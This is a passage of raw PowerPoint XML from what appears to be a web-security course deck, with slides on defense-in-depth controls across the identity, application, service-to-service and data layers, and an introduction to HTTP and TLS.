              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Picture 2" descr="A screen shot of a computer&#10;&#10;AI-generated content may be incorrect.">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B7523142-3EAF-5511-18F0-6402070B2CBD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6663342" y="1825401"/>
            <a:ext cx="4948213" cy="3398964"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="376214476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FEC1D-5655-2749-87B8-5BFF2F896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6AB49-BAF1-3179-9126-B9CD0F6ECA22}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Defense in Depth – Users &amp; Identity</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E5F4FB79-48AC-150D-8F39-7B968BF64D94}"/>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dirty="0"/>
              <a:t>User &amp; identity layer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Controls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Strong auth (SSO, MFA)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Least-privilege roles / groups</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Session management, token expiry, device checks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="28708085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1C9C-5DDA-A43C-1C47-4C370D73F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57FA8-0366-8B03-087A-2CBE447EDDBF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Defense in Depth – Application</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3FB21C26-D781-A607-DE45-D3983832FDEB}"/>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dirty="0"/>
              <a:t>Application / API layer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Controls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Input validation &amp; sanitization</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Proper authorization checks (per-resource, per-tenant)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Rate limiting / throttling</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Safe error handling (no stack traces to users)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="365833813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8E34C-709F-FBC2-5520-81E855111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15781-543C-62D9-0258-4D3CB10999CC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Defense in Depth – Service to Service</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{67C6116E-3119-3716-EE97-CBF551586568}"/>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dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Service-to-service (east–west) layer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Controls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>mTLS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> between services</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Service identities </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Service mesh policies</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Network visibility &amp; logging</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="5853917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DC2A-A83F-0EF6-F427-14A03FC1A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E7133-955F-240A-AE40-7B19A8FC79F4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Defense in Depth – Data layer</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B5BEFB93-50EC-9D24-6409-C86EBB69295E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7695323" cy="4692924"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Data layer </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Controls</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>DB auth and least-privilege DB users</a:t>
            </a:r>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Row-/column-level security where appropriate</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Encryption at rest</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="514350" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Strictly controlled backups and exports</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="0A0A0A"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="41489363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93B2-8E81-E197-8337-24BF1D665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F65FE-A993-6170-3164-B226F3946A0B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Defense in Depth – Key Takeaway</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{64DBD19B-2536-F832-F919-D5E0ED90AF44}"/>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dirty="0"/>
              <a:t>Security isn't just about preventing a breach – it's also about limiting damage in the event of a breach</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="23161047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56C4-AB6C-6F78-5027-FE611F0BA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73185-91A4-C295-FD50-63B34C5AE39A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1313597"/>
            <a:ext cx="10515600" cy="4237977"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Lesson 03 –</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:latin typeface="Aptos Display"/>
                <a:ea typeface="Cambria"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t> HTTPS &amp; TLS </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="6600" dirty="0">
                <a:ea typeface="Cambria"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Topic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 01 –</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Aptos Display"/>
                <a:ea typeface="Cambria"/>
              </a:rPr>
              <a:t> HTTP and TLS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0">
              <a:ea typeface="Cambria"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="6219991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162A3-5AD4-49E0-27D7-01147FA98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FABC8-7538-17E7-6F19-4A30CDB155F0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.2.3 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>HTTP Refresher</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{83EC7812-BB10-9D78-8667-080CFCB1CFD7}"/>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dirty="0"/>
              <a:t>Hypertext Transfer Protocol (HTTP) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0A0A0A"/>
                </a:solidFill>
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>is a request-response protocol that works by a client sending a request for a resource, and the server sending back a response with the requested information.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="151803456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4A20-0B86-B827-1E6B-9E5C40FB1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927D0-2520-B129-EA8B-E8BB1703314B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>DEMO</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C1C24C08-C3BC-8116-F79C-94DFD0907B7A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7695323" cy="4692924"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Wireshark PCAP – HTTP Request/Response Analysis</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="89970124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9787A-61BA-96C8-EA1B-9FF7A079B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AA328-D42A-01A0-3F06-F4C5859F3555}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>1.3.1 - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mj-lt"/>
                <a:cs typeface="+mj-lt"/>
              </a:rPr>
              <a:t>HTTP Statelessness</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0701F2A7-5930-6E83-57A5-E82D10398DD8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1825625"/>
            <a:ext cx="7695323" cy="4276482"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t>Statelessness</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:ea typeface="+mn-lt"/>
                <a:cs typeface="+mn-lt"/>
              </a:rPr>
              <a:t> means:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
